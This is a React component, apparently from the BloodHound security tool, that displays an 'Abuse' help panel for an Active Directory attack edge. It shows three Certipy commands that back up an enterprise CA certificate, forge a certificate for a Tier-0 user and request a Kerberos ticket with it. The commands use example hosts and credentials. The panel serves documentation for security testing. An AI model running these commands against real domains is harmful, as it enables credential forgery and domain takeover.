// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                1) Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host
                using Certipy:
                <Typography component={'pre'}>
                    {"certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!'"}
                </Typography>
                The enterprise CA certificate is the one where issuer and subject are identical.
                <br />
                <br />
                2) Forge a certificate of a target principal:
                <Typography component={'pre'}>
                    {
                        "certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire'"
                    }
                </Typography>
                <br />
                3) Request a TGT for the targeted principal using the certificate against a given DC:
                <Typography component={'pre'}>
                    {"certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10'"}
                </Typography>
            </Typography>
        </>
    );
};

export default Abuse;
